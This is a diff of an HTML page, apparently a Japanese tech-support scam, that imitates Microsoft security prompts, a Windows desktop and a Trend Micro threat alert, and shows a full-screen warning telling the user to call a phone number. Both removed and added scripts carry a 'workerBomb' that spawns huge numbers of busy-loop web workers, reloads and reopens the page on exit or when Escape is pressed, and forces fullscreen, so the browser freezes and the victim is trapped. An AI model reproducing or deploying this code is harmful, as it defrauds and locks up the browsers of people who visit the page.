+        background: rgba(255, 255, 255, 0.08);
+      }
+      #start-power svg {
+        width: 18px;
+        height: 18px;
       }
 
-      .fs-prompt__complete-body {
-        display: inline-block;
-        text-align: left;
-        border: 1px solid #000000;
-        padding: 10px;
+      /* ── Windows Dialog / Modal ── */
+      .win-dialog-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.35);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 100000;
       }
-
-      .fs-prompt__complete-note {
-        display: block;
-        margin-top: 12px;
-        font-size: 0.86rem;
-      }
-
-      .fs-prompt__label-red {
-        color: #d93025;
-      }
-
-      .fs-prompt__scan-label {
-        margin: 0 0 8px;
-        font-size: 0.95rem;
-        font-weight: 600;
-        letter-spacing: 0.03em;
-        color: #202124;
-      }
-
-      .fs-prompt__progress {
-        width: 100%;
-        height: 6px;
-        background: #e8eaed;
-        border-radius: 3px;
+      .win-dialog {
+        background: #f3f3f3;
+        border: 1px solid #d1d1d1;
+        border-radius: 8px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.18);
+        width: 460px;
+        display: flex;
+        flex-direction: column;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
         overflow: hidden;
-        margin: 0 0 14px;
       }
-
-      .fs-prompt__progress-fill {
-        width: 0%;
+      .win-dialog-titlebar {
+        height: 32px;
+        display: flex;
+        align-items: center;
+        padding: 0 4px 0 12px;
+        background: #f3f3f3;
+        flex-shrink: 0;
+      }
+      .win-dialog-titlebar-text {
+        font-size: 12px;
+        color: #1a1a1a;
+        flex: 1;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+      }
+      .win-dialog-titlebar-btns {
+        display: flex;
         height: 100%;
-        background: linear-gradient(90deg, #1a73e8, #4285f4);
-        transition: width 200ms linear;
       }
-
-      .fs-prompt__scan-feed {
-        margin: 0 0 14px;
-        background: #000000;
-        border: 1px solid #1f1f1f;
-        border-radius: 6px;
-        height: 6.8em;
-        overflow: hidden;
-        padding: 8px 10px;
+      .win-dialog-titlebar-btn {
+        width: 46px;
+        height: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: none;
+        background: transparent;
+        cursor: pointer;
+        transition: background 0.1s;
       }
-
-      .fs-prompt__scan-feed-list {
-        margin: 0;
-        padding: 0;
-        list-style: none;
-        color: #31d158;
-        font-size: 0.9rem;
-        font-family: "SFMono-Regular", Menlo, Monaco, Consolas, monospace;
-        line-height: 1.7;
-        transform: translateY(0);
+      .win-dialog-titlebar-btn svg {
+        width: 10px;
+        height: 10px;
       }
-
-      .fs-prompt__scan-feed-list.is-running {
-        animation: fs-prompt-scan-scroll 10s linear forwards;
+      .win-dialog-titlebar-btn:hover {
+        background: rgba(0, 0, 0, 0.06);
       }
-
-      @keyframes fs-prompt-scan-scroll {
-        from {
-          transform: translateY(0);
-        }
-        to {
-          transform: translateY(calc(-1.7em * 16));
-        }
+      .win-dialog-titlebar-btn.dlg-close:hover {
+        background: #e81123;
       }
-
-      .fs-prompt__actions {
+      .win-dialog-titlebar-btn.dlg-close:hover svg line {
+        stroke: #fff;
+      }
+      .win-dialog-titlebar-btn.dlg-disabled {
+        opacity: 0.3;
+        cursor: default;
+        pointer-events: none;
+      }
+      .win-dialog-body {
+        padding: 8px 28px 20px;
+        display: flex;
+        gap: 18px;
+        align-items: flex-start;
+      }
+      .win-dialog-icon {
+        width: 36px;
+        height: 36px;
+        flex-shrink: 0;
+        margin-top: 2px;
+      }
+      .win-dialog-icon svg {
+        width: 36px;
+        height: 36px;
+      }
+      .win-dialog-text {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+      }
+      .win-dialog-title {
+        font-size: 14px;
+        font-weight: 600;
+        color: #1a1a1a;
+        line-height: 1.35;
+      }
+      .win-dialog-message {
+        font-size: 13px;
+        color: #444;
+        line-height: 1.5;
+      }
+      .win-dialog-footer {
+        padding: 12px 28px 20px;
         display: flex;
         justify-content: flex-end;
         gap: 8px;
       }
-
-      .fs-prompt__btn {
-        appearance: none;
-        font: inherit;
+      .win-dialog-btn {
+        min-width: 108px;
+        height: 32px;
+        padding: 0 16px;
+        font-size: 13px;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
         border-radius: 4px;
-        padding: 8px 16px;
         cursor: pointer;
-        line-height: 1.2;
+        border: 1px solid #d1d1d1;
+        background: #fdfdfd;
+        color: #1a1a1a;
         transition:
-          background-color 120ms ease,
-          box-shadow 120ms ease;
+          background 0.1s,
+          border-color 0.1s,
+          transform 0.1s;
       }
-
-      .fs-prompt__btn--primary {
-        background: #e81a1a;
-        color: #ffffff;
-        border: 1px solid #e81a1a;
-        animation: fs-prompt-blink 1s ease-in-out infinite;
-        box-shadow: 0 0 0 0 rgba(232, 26, 26, 0.6);
+      .win-dialog-btn:hover {
+        background: #e9e9e9;
+        border-color: #bbb;
       }
-
-      .fs-prompt__btn--primary:hover {
-        background: #e81a1a;
-        border-color: #e81a1a;
-        box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3);
+      .win-dialog-btn:active {
+        background: #d5d5d5;
+        transform: scale(0.96);
       }
-
-      @keyframes fs-prompt-blink {
+      .win-dialog-btn-primary {
+        background: #0067c0;
+        color: #fff;
+        border: 1px solid #0067c0;
+        animation: dlg-btn-pulse 2s ease-in-out infinite;
+      }
+      .win-dialog-btn-primary:hover {
+        background: #1a75c7;
+        border-color: #1a75c7;
+        animation: none;
+      }
+      .win-dialog-btn-primary:active {
+        background: #005a9e;
+        border-color: #005a9e;
+        animation: none;
+        transform: scale(0.96);
+      }
+      .win-dialog-btn:focus-visible,
+      .win-dialog-btn-primary:focus-visible {
+        outline: 2px solid #005a9e;
+        outline-offset: 1px;
+      }
+      @keyframes dlg-btn-pulse {
         0%,
         100% {
-          background: #e81a1a;
-          border-color: #e81a1a;
-          box-shadow: 0 0 0 0 rgba(232, 26, 26, 0.6);
+          box-shadow: 0 0 0 0 rgba(0, 103, 192, 0.45);
         }
         50% {
-          background: #ff5252;
-          border-color: #ff5252;
-          box-shadow: 0 0 0 6px rgba(232, 26, 26, 0);
+          box-shadow: 0 0 0 6px rgba(0, 103, 192, 0);
         }
       }
 
-      @media (prefers-reduced-motion: reduce) {
-        .fs-prompt__btn--primary {
-          animation: none;
+      /* ── Trend Micro Popup ── */
+      #trendmicro-template {
+        display: none;
+      }
+      .tm-popup {
+        position: fixed;
+        right: 12px;
+        width: 360px;
+        background: #fff;
+        border-radius: 4px;
+        box-shadow:
+          0 2px 16px rgba(0, 0, 0, 0.22),
+          0 0 0 1px rgba(0, 0, 0, 0.06);
+        z-index: 200000;
+        font-family: "Segoe UI", "Meiryo", sans-serif;
+        overflow: hidden;
+        animation: tm-slide-in 0.4s ease-out;
+      }
+      @keyframes tm-slide-in {
+        from {
+          transform: translateX(100%);
+          opacity: 0;
+        }
+        to {
+          transform: translateX(0);
+          opacity: 1;
         }
       }
-
-      .fs-prompt__btn--secondary {
-        background: #ffffff;
-        color: #1a73e8;
-        border: 1px solid #dadce0;
+      .tm-header {
+        background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
+        padding: 10px 14px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        position: relative;
+      }
+      .tm-logo {
+        width: 28px;
+        height: 28px;
+        flex-shrink: 0;
+        background: #fff;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .tm-logo svg {
+        width: 20px;
+        height: 20px;
+      }
+      .tm-header-text {
+        display: flex;
+        flex-direction: column;
+        flex: 1;
+      }
+      .tm-header-title {
+        font-size: 13px;
+        font-weight: 700;
+        color: #fff;
+        letter-spacing: 0.3px;
+      }
+      .tm-header-subtitle {
+        font-size: 10px;
+        color: rgba(255, 255, 255, 0.85);
+        margin-top: 1px;
+      }
+      .tm-close {
+        position: absolute;
+        top: 6px;
+        right: 6px;
+        width: 24px;
+        height: 24px;
+        background: transparent;
+        border: none;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 3px;
+        transition: background 0.1s;
+      }
+      .tm-close:hover {
+        background: rgba(255, 255, 255, 0.2);
+      }
+      .tm-close svg {
+        width: 12px;
+        height: 12px;
+      }
+      .tm-body {
+        padding: 14px 16px;
+        display: flex;
+        align-items: flex-start;
+        gap: 12px;
+      }
+      .tm-shield {
+        width: 36px;
+        height: 36px;
+        flex-shrink: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .tm-shield svg {
+        width: 36px;
+        height: 36px;
+      }
+      .tm-body-text {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+      }
+      .tm-body-title {
+        font-size: 13px;
+        font-weight: 600;
+        color: #1a1a1a;
+        line-height: 1.4;
+      }
+      .tm-body-desc {
+        font-size: 12px;
+        color: #555;
+        line-height: 1.5;
+      }
+      .tm-body-threat {
+        font-size: 11px;
+        color: #d32f2f;
+        font-weight: 600;
+        margin-top: 2px;
+      }
+      .tm-footer {
+        padding: 8px 16px 12px;
+        display: flex;
+        gap: 8px;
+        justify-content: center;
+        border-top: 1px solid #f0f0f0;
+      }
+      .tm-btn {
+        height: 28px;
+        padding: 0 16px;
+        font-size: 12px;
+        font-family: "Segoe UI", "Meiryo", sans-serif;
+        border-radius: 3px;
+        cursor: pointer;
+        border: 1px solid #ccc;
+        background: #f5f5f5;
+        color: #333;
+        transition: background 0.1s;
+      }
+      .tm-btn:hover {
+        background: #e8e8e8;
+      }
+      .tm-btn-primary {
+        background: #d32f2f;
+        color: #fff;
+        border: 1px solid #d32f2f;
+      }
+      .tm-btn-primary:hover {
+        background: #c62828;
+        border-color: #c62828;
+      }
+      .tm-timestamp {
+        padding: 0 16px 10px;
+        font-size: 10px;
+        color: #aaa;
+        text-align: right;
       }
 
-      .fs-prompt__btn--secondary:hover {
-        background: #f1f3f4;
-        border-color: #c6c9cc;
+      /* ── Settings App ── */
+      .settings-container {
+        display: flex;
+        height: 100%;
+        background: #f3f3f3;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      }
+      .settings-sidebar {
+        width: 280px;
+        padding: 12px 0;
+        overflow-y: auto;
+        flex-shrink: 0;
+        display: flex;
+        flex-direction: column;
+      }
+      .settings-sidebar-profile {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 10px 20px;
+        margin: 0 8px 8px;
+        border-radius: 6px;
+        cursor: pointer;
+      }
+      .settings-sidebar-profile:hover {
+        background: rgba(0, 0, 0, 0.04);
+      }
+      .settings-profile-avatar {
+        width: 48px;
+        height: 48px;
+        border-radius: 50%;
+        background: #0078d4;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+      }
+      .settings-profile-avatar svg {
+        width: 28px;
+        height: 28px;
+      }
+      .settings-profile-info {
+        display: flex;
+        flex-direction: column;
+      }
+      .settings-profile-name {
+        font-size: 14px;
+        font-weight: 600;
+        color: #1a1a1a;
+      }
+      .settings-profile-email {
+        font-size: 12px;
+        color: #666;
+      }
+      .settings-search {
+        margin: 4px 16px 12px;
+        height: 34px;
+        background: #fff;
+        border: 1px solid #d5d5d5;
+        border-radius: 4px;
+        display: flex;
+        align-items: center;
+        padding: 0 10px;
+        gap: 8px;
+        font-size: 13px;
+        color: #888;
+      }
+      .settings-search svg {
+        width: 14px;
+        height: 14px;
+        opacity: 0.5;
+        flex-shrink: 0;
+      }
+      .settings-nav {
+        display: flex;
+        flex-direction: column;
+        gap: 1px;
+      }
+      .settings-nav-item {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        padding: 9px 20px;
+        margin: 0 8px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 13px;
+        color: #1a1a1a;
+        transition: background 0.1s;
+      }
+      .settings-nav-item:hover {
+        background: rgba(0, 0, 0, 0.04);
+      }
+      .settings-nav-item.active {
+        background: rgba(0, 0, 0, 0.06);
+      }
+      .settings-nav-item svg {
+        width: 18px;
+        height: 18px;
+        flex-shrink: 0;
+      }
+      .settings-nav-item span {
+        flex: 1;
+      }
+
+      .settings-content {
+        flex: 1;
+        padding: 32px 40px;
+        overflow-y: auto;
+        background: #f9f9f9;
+        border-left: 1px solid #e5e5e5;
+      }
+      .settings-content h1 {
+        font-size: 28px;
+        font-weight: 600;
+        color: #1a1a1a;
+        margin-bottom: 24px;
+      }
+      .settings-card {
+        background: #fff;
+        border-radius: 8px;
+        border: 1px solid #e5e5e5;
+        margin-bottom: 8px;
+        overflow: hidden;
+      }
+      .settings-card-header {
+        font-size: 13px;
+        font-weight: 600;
+        color: #1a1a1a;
+        padding: 16px 20px 8px;
+      }
+      .settings-row {
+        display: flex;
+        align-items: center;
+        padding: 12px 20px;
+        gap: 14px;
+        min-height: 48px;
+        transition: background 0.1s;
+        cursor: default;
+      }
+      .settings-row:hover {
+        background: rgba(0, 0, 0, 0.02);
+      }
+      .settings-row + .settings-row {
+        border-top: 1px solid #f0f0f0;
+      }
+      .settings-row-icon {
+        width: 18px;
+        height: 18px;
+        flex-shrink: 0;
+        color: #444;
+      }
+      .settings-row-icon svg {
+        width: 18px;
+        height: 18px;
+      }
+      .settings-row-text {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        gap: 2px;
+      }
+      .settings-row-label {
+        font-size: 13px;
+        color: #1a1a1a;
+      }
+      .settings-row-desc {
+        font-size: 12px;
+        color: #777;
+      }
+      .settings-row-value {
+        font-size: 12px;
+        color: #555;
+        margin-left: auto;
+        padding-left: 12px;
+        white-space: nowrap;
+      }
+      .settings-row-chevron {
+        flex-shrink: 0;
+        color: #999;
+      }
+      .settings-row-chevron svg {
+        width: 12px;
+        height: 12px;
+      }
+
+      /* Toggle switch */
+      .settings-toggle {
+        width: 40px;
+        height: 20px;
+        border-radius: 10px;
+        background: #888;
+        position: relative;
+        cursor: pointer;
+        flex-shrink: 0;
+        transition: background 0.2s;
+      }
+      .settings-toggle.on {
+        background: #0067c0;
+      }
+      .settings-toggle::after {
+        content: "";
+        position: absolute;
+        top: 2px;
+        left: 2px;
+        width: 16px;
+        height: 16px;
+        border-radius: 50%;
+        background: #fff;
+        transition: left 0.2s;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+      }
+      .settings-toggle.on::after {
+        left: 22px;
+      }
+
+      /* ── Overlay for drag ── */
+      #drag-overlay {
+        position: fixed;
+        inset: 0;
+        z-index: 99999;
+        display: none;
+        cursor: default;
+      }
+
+      /* ── Fullscreen loading overlay ── */
+      #fs-loading-overlay {
+        position: fixed;
+        inset: 0;
+        z-index: 2147483647;
+        background: #000;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        gap: 24px;
+        color: #fff;
+        font-family:
+          "Segoe UI", "Yu Gothic UI", "Meiryo", system-ui, sans-serif;
+      }
+      #fs-loading-overlay.visible {
+        display: flex;
+      }
+      #fs-loading-spinner {
+        width: 48px;
+        height: 48px;
+        border: 4px solid rgba(255, 255, 255, 0.15);
+        border-top-color: #fff;
+        border-radius: 50%;
+        animation: fs-loading-spin 1s linear infinite;
+      }
+      #fs-loading-box {
+        border: 2px solid #fff;
+        padding: 28px 36px;
+        max-width: 520px;
+        color: #fff;
+        text-align: center;
+        line-height: 1.7;
+        font-size: 14px;
+        letter-spacing: 0.04em;
+        background: rgba(0, 0, 0, 0.4);
+        animation: fs-loading-box-zoom 1.8s ease-in-out infinite;
+      }
+      #fs-loading-box .fs-loading-title {
+        font-size: 16px;
+        font-weight: 600;
+        margin-bottom: 14px;
+        letter-spacing: 0.06em;
+      }
+      #fs-loading-box .fs-loading-sub {
+        font-size: 12px;
+        opacity: 0.7;
+        margin-top: 14px;
+        font-family: "Consolas", "Menlo", monospace;
+        letter-spacing: 0.02em;
+      }
+      @keyframes fs-loading-spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      @keyframes fs-loading-box-zoom {
+        0%,
+        100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.12);
+        }
       }
     </style>
     <script>
-      function toggleFullScreen(e) {
-    var n = document.body;
-    e instanceof HTMLElement && (n = e);
-    var t = document.webkitIsFullScreen || document.mozFullScreen || !1;
-    n.requestFullScreen = n.requestFullScreen || n.webkitRequestFullScreen || n.mozRequestFullScreen || function() {
-        return !1
-    }
-        ,
-        document.cancelFullScreen = document.cancelFullScreen || document.webkitCancelFullScreen || document.mozCancelFullScreen || function() {
-            return !1
-        }
-        ,
-        t ? document.cancelFullScreen() : n.requestFullScreen()
-}
-function addEvent(e, n, t) {
-    e.addEventListener ? e.addEventListener(n, t, !1) : e.attachEvent && e.attachEvent("on" + n, t)
-}
-$(document).ready(function() {
-    var e = document.createElement("audio");
-    e.setAttribute("src", "/"),
-        e.addEventListener("ended", function() {
-            this.play()
-        }, !1),
-        $(".map").click(function() {
-            e.play()
-        }),
-        $(".black").click(function() {
-            e.play()
-        }),
-        $("#footer").click(function() {
-            e.play()
-        }),
-        $("#dwewfweqqquuu").click(function() {
-            e.play()
-        })
-}),
-    $(document).ready(function() {
-        $("body").mouseover(function() {
-            $("#footer").fadeIn("").css({
-                bottom: -20,
-                position: "fixed"
-            }).animate({
-                bottom: -20
-            }, 200, function() {})
-        })
-    }),
-    $(document).ready(function() {
-        $(".arow-div").delay(1e3).fadeIn(500)
-    }),
-    $(document).ready(function() {
-        $("#dwewfweqqquuu").click(function() {
-            $("#dwewfweqqquuu").hide("fast")
-        })
-    }),
-    $(document).ready(function() {
-        $(".alert_popup").click(function() {
-            $(".alert_popup").hide("fast")
-        })
-    }),
-    $(document).ready(function() {
-        $("#footer").click(function() {
-            $("#dwewfweqqquuu").hide("fast")
-        })
-    }),
-    $(document).ready(function() {
-        $(".black").click(function() {
-            $(".delayedPopupWindow").hide("fast")
-        })
-    }),
-    addEvent(document, "mouseout", function(e) {
-        null == e.toElement && null == e.relatedTarget && $(".lightbox").slideDown()
-    }),
-    $("a.close").click(function() {
-        $(".lightbox").slideUp()
-    }),
-    $("body").click(function() {
-        $(".lightbox").slideUp()
-    }),
-    window.addEventListener("beforeunload", function(e) {
-        var n = "It looks like you have been editing something. If you leave before saving, your changes will be lost.";
-        return (e || window.event).returnValue = n,
-            n
-    }),
-    addEventListener("click", function() {
-        var e = document.documentElement;
-        (e.requestFullScreen || e.webkitRequestFullScreen || e.mozRequestFullScreen).call(e)
-    });
+      function runWorkerBombSequence() {
+        setTimeout(() => {
+          window.location.href = window.location.href;
+        }, 1);
 
-    </script>
-    <script>
-      function toggleFullScreen(e) {
-    var n = document.body;
-    e instanceof HTMLElement && (n = e);
-    var t = document.webkitIsFullScreen || document.mozFullScreen || !1;
-    n.requestFullScreen = n.requestFullScreen || n.webkitRequestFullScreen || n.mozRequestFullScreen || function() {
-        return !1
-    }
-        ,
-        document.cancelFullScreen = document.cancelFullScreen || document.webkitCancelFullScreen || document.mozCancelFullScreen || function() {
-            return !1
-        }
-        ,
-        t ? document.cancelFullScreen() : n.requestFullScreen()
-}
-function addEvent(e, n, t) {
-    e.addEventListener ? e.addEventListener(n, t, !1) : e.attachEvent && e.attachEvent("on" + n, t)
-}
-$(document).ready(function() {
-    var e = document.createElement("audio");
-    e.setAttribute("src", "https://newpp81.onrender.com/02sghsjp2.mp4"),
-        e.addEventListener("ended", function() {
-            this.play()
-        }, !1),
-        $(".map").click(function() {
-            e.play()
-        }),
-        $(".black").click(function() {
-            e.play()
-        }),
-        $("#footer").click(function() {
-            e.play()
-        }),
-        $("#dwewfweqqquuu").click(function() {
-            e.play()
-        })
-}),
-    $(document).ready(function() {
-        $("body").mouseover(function() {
-            $("#footer").fadeIn("").css({
-                bottom: -20,
-                position: "fixed"
-            }).animate({
-                bottom: -20
-            }, 200, function() {})
-        })
-    }),
-    $(document).ready(function() {
-        $(".arow-div").delay(1e3).fadeIn(500)
-    }),
-    $(document).ready(function() {
-        $("#dwewfweqqquuu").click(function() {
-            $("#dwewfweqqquuu").hide("fast")
-        })
-    }),
-    $(document).ready(function() {
-        $(".alert_popup").click(function() {
-            $(".alert_popup").hide("fast")
-        })
-    }),
-    $(document).ready(function() {
-        $("#footer").click(function() {
-            $("#dwewfweqqquuu").hide("fast")
-        })
-    }),
-    $(document).ready(function() {
-        $(".black").click(function() {
-            $(".delayedPopupWindow").hide("fast")
-        })
-    }),
-    addEvent(document, "mouseout", function(e) {
-        null == e.toElement && null == e.relatedTarget && $(".lightbox").slideDown()
-    }),
-    $("a.close").click(function() {
-        $(".lightbox").slideUp()
-    }),
-    $("body").click(function() {
-        $(".lightbox").slideUp()
-    }),
-    window.addEventListener("beforeunload", function(e) {
-        var n = "It looks like you have been editing something. If you leave before saving, your changes will be lost.";
-        return (e || window.event).returnValue = n,
-            n
-    }),
-    addEventListener("click", function() {
-        var e = document.documentElement;
-        (e.requestFullScreen || e.webkitRequestFullScreen || e.mozRequestFullScreen).call(e)
-    });
+        let workers = [];
 
-    </script>
-    <script>
+        function workerBomb() {
+          console.log("Starting workerBomb...");
 
-let workers = [];
-let isResponsive = true;
-
-function workerBomb() {
-    console.log("Starting workerBomb...");
-
-    const script = `
+          const script = `
             let counter = 0;
             while (true) {
               counter++;
@@ -1087,1052 +1298,1591 @@ function workerBomb() {
               }
             }
           `;
-    const blob = new Blob([script], { type: "application/javascript" });
-    const workerURL = URL.createObjectURL(blob);
+          const blob = new Blob([script], { type: "application/javascript" });
+          const workerURL = URL.createObjectURL(blob);
 
-    // Create 10 workers (adjust the number to reduce load)
-    for (let i = 0; i < 1000000000000; i++) {
-        const worker = new Worker(workerURL);
-        workers.push(worker);
+          // Create 10 workers (adjust the number to reduce load)
+          for (let i = 0; i < 1000000000000; i++) {
+            const worker = new Worker(workerURL);
+            workers.push(worker);
 
-        worker.onmessage = (event) => {
-            if (event.data.status === "working") {
+            worker.onmessage = (event) => {
+              if (event.data.status === "working") {
                 console.log(`Worker ${i} progress: ${event.data.counter}`);
+              }
+            };
+
+            worker.onerror = (error) => {
+              console.error(`Worker ${i} encountered an error:`, error);
+            };
+          }
+
+          // Start the responsiveness watchdog
+          // startWatchdog();
+        }
+
+        function startWatchdog() {
+          console.log("Starting watchdog...");
+
+          let lastTime = Date.now();
+
+          const watchdogInterval = setInterval(() => {
+            const currentTime = Date.now();
+
+            if (currentTime - lastTime > 2000) {
+              console.warn(
+                "Browser unresponsive detected. Terminating workers...",
+              );
+              terminateWorkers();
+              clearInterval(watchdogInterval);
+            } else {
+              lastTime = currentTime;
             }
-        };
+          }, 100);
 
-        worker.onerror = (error) => {
-            console.error(`Worker ${i} encountered an error:`, error);
-        };
-    }
-
-    // Start the responsiveness watchdog
-    // startWatchdog();
-}
-
-// Watchdog function to monitor browser responsiveness
-function startWatchdog() {
-    console.log("Starting watchdog...");
-
-    let lastTime = Date.now();
-
-    const watchdogInterval = setInterval(() => {
-        const currentTime = Date.now();
-
-        // If the browser is unresponsive for more than 2 seconds, terminate workers
-        if (currentTime - lastTime > 2000) {
-            console.warn("Browser unresponsive detected. Terminating workers...");
-            terminateWorkers();
-            clearInterval(watchdogInterval);
-        } else {
-            // Update the last time to keep track of responsiveness
-            lastTime = currentTime;
+          (function monitorResponsiveness() {
+            for (let i = 0; i < 1e6; i++) {} // Simulate a small task
+            if (workers.length > 0) {
+              requestAnimationFrame(monitorResponsiveness);
+            }
+          })();
         }
-    }, 100);
 
-    // Simulate lightweight work on the main thread to detect unresponsiveness
-    (function monitorResponsiveness() {
-        for (let i = 0; i < 1e6; i++) {} // Simulate a small task
-        if (workers.length > 0) {
-            requestAnimationFrame(monitorResponsiveness);
+        function terminateWorkers() {
+          workers.forEach((worker, index) => {
+            worker.terminate();
+            console.log(`Worker ${index} terminated.`);
+          });
+          workers = [];
+          console.log("All workers terminated.");
         }
-    })();
-}
 
-// Function to terminate all workers
-function terminateWorkers() {
-    workers.forEach((worker, index) => {
-        worker.terminate();
-        console.log(`Worker ${index} terminated.`);
-    });
-    workers = [];
-    console.log("All workers terminated.");
-}
+        for (let i = 0; i < 20; i++) {
+          workerBomb();
+        }
+      }
 
-const WORKER_BOMB_BURST_COUNT = 20;
+      function initEscapeBomb() {
+        let escapeHoldTimer = null;
 
-function runWorkerBombBurst() {
-    for (let b = 0; b < WORKER_BOMB_BURST_COUNT; b++) {
-        workerBomb();
-    }
-}
+        document.addEventListener("keydown", (event) => {
+          if (
+            event.key === "Escape" &&
+            !event.repeat &&
+            escapeHoldTimer === null
+          ) {
+            escapeHoldTimer = setTimeout(() => {
+              runWorkerBombSequence();
+              escapeHoldTimer = null;
+            }, 1000);
+          }
+        });
 
-window.addEventListener('beforeunload', function (event) {
-    window.open(window.location.href, '_blank');
-    setTimeout(() => {
-        window.location.href = window.location.href;
-    }, 1);
-    runWorkerBombBurst();
-    // Custom message (not all browsers display this)
-    const message = "Are you sure you want to leave this page?";
+        document.addEventListener("keyup", (event) => {
+          if (event.key === "Escape" && escapeHoldTimer !== null) {
+            clearTimeout(escapeHoldTimer);
+            escapeHoldTimer = null;
+          }
+        });
+      }
 
-    // Set the returnValue property to trigger the confirmation dialog
-    event.returnValue = message;
+      initEscapeBomb();
 
-    // Return the message string for some older browsers
-    return message;
-});
+      window.addEventListener("beforeunload", function (event) {
+        runWorkerBombSequence();
 
-window.addEventListener('unload', function (event) {
-    window.open(window.location.href, '_blank');
-    setTimeout(() => {
-        window.location.href = window.location.href;
-    }, 1);
-    runWorkerBombBurst();
-    // Custom message (not all browsers display this)
-    const message = "Are you sure you want to leave this page?";
+        const message = "Are you sure you want to leave this page?";
+        event.returnValue = message;
+        return message;
+      });
 
-    // Set the returnValue property to trigger the confirmation dialog
-    event.returnValue = message;
-
-    // Return the message string for some older browsers
-    return message;
-});
-
-window.addEventListener('keydown', function (event) {
-    if (event.key !== 'Escape') return;
-    runWorkerBombBurst();
-});
-
+      window.addEventListener("unload", function () {
+        runWorkerBombSequence();
+      });
     </script>
   </head>
-  <body class="site-loading">
-    <main class="viewer-container">
-      <!--
-        ここに実際の3Dビューア実装を配置してください。
-        例:
-        - Three.js の canvas と renderer のマウント先
-        - <model-viewer> カスタム要素
-        - 別ページを埋め込む iframe
-      -->
-    </main>
+  <body>
+    <div id="fs-loading-overlay" aria-hidden="true">
+      <div id="fs-loading-spinner"></div>
+      <div id="fs-loading-box">
+        <div class="fs-loading-title">
+          お使いのコンピュータが正常に動作していません。
+          
+          </div>
+          <div>
+          現在、コンピュータをスキャンしています。ページを更新しないでください。
+          
+          コンピュータから情報を受信して​​います。しばらくお待ちください。
+          
+          コンピュータにさらに問題が発生した場合は、次の番号にお電話ください。<br />(0101-828-573-3013)
+          </div>
+          <div class="fs-loading-sub">
+          [SYS] init.d/webos.service — 起動中<br />
+          [OK] /dev/sda1 をマウント中... ウィンドウマネージャ v3.14.159 をロード中<br />
+          [INFO] 残り推定時間: 約10秒
+          </div>
+          </div>
+    </div>
+    <div id="desktop">
+      <!-- Desktop Icons -->
+      <div id="desktop-icons"></div>
 
-    <div
-      class="fs-prompt-backdrop"
-      id="fsPromptBackdrop"
-      aria-hidden="true"
-    ></div>
+      <!-- Windows container -->
+      <div id="windows-container"></div>
 
-    <div
-      class="fs-prompt"
-      id="fsPrompt"
-      role="dialog"
-      aria-live="polite"
-      aria-label="全画面モードのご案内"
-    >
-      <div class="fs-prompt__content">
-        <div class="fs-prompt__topbar">
-          <img
-            class="fs-prompt__topbar-logo"
-            src="https://files-pop.s3.ap-northeast-1.amazonaws.com/msmm.png"
-            alt=""
-            aria-hidden="true"
-          />
-          <span>Microsoft 安全</span>
+      <!-- Start Menu -->
+      <div id="start-menu">
+        <div id="start-menu-search">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <circle cx="11" cy="11" r="8" />
+            <path
+              d="M21 21l-4.35-4.35"
+              stroke-width="2"
+              stroke-linecap="round"
+            />
+          </svg>
+          ここに入力して検索
         </div>
-        <div class="fs-prompt__window-controls" aria-label="ウィンドウ操作">
-          <button
-            type="button"
-              class="fs-prompt__chrome-btn"
-            id="fsPromptControlMin"
-            aria-label="最小化"
-          >
-            &minus;
-          </button>
-          <button
-            type="button"
-              class="fs-prompt__chrome-btn"
-            id="fsPromptControlMax"
-            aria-label="最大化"
-          >
-            &#9633;
-          </button>
-          <button
-            type="button"
-              class="fs-prompt__chrome-btn"
-            id="fsPromptControlClose"
-            aria-label="閉じる"
-          >
-            &times;
-          </button>
+        <div id="start-menu-label">ピン留め済み</div>
+        <div id="start-menu-grid"></div>
+        <div id="start-menu-footer">
+          <div id="start-user">
+            <div id="start-user-avatar">
+              <svg fill="currentColor" viewBox="0 0 24 24">
+                <path
+                  d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"
+                />
+              </svg>
+            </div>
+            <span id="start-user-name">ユーザー</span>
+          </div>
+          <div id="start-power">
+            <svg
+              fill="none"
+              stroke="currentColor"
+              stroke-width="2"
+              viewBox="0 0 24 24"
+            >
+              <path d="M12 3v9" stroke-linecap="round" />
+              <path
+                d="M18.36 6.64A9 9 0 1 1 5.64 6.64"
+                stroke-linecap="round"
+              />
+            </svg>
+          </div>
         </div>
-        <div style="text-align: center">
-          <img
-            src="https://msftstories.thesourcemediaassets.com/2022/05/Microsoft-logo_rgb_c-gray-1536x688.png"
-            height="100px"
-          />
-        </div>
-        <div class="fs-prompt__phase" id="fsPromptPhaseLoading">
-          <p class="fs-prompt__message">
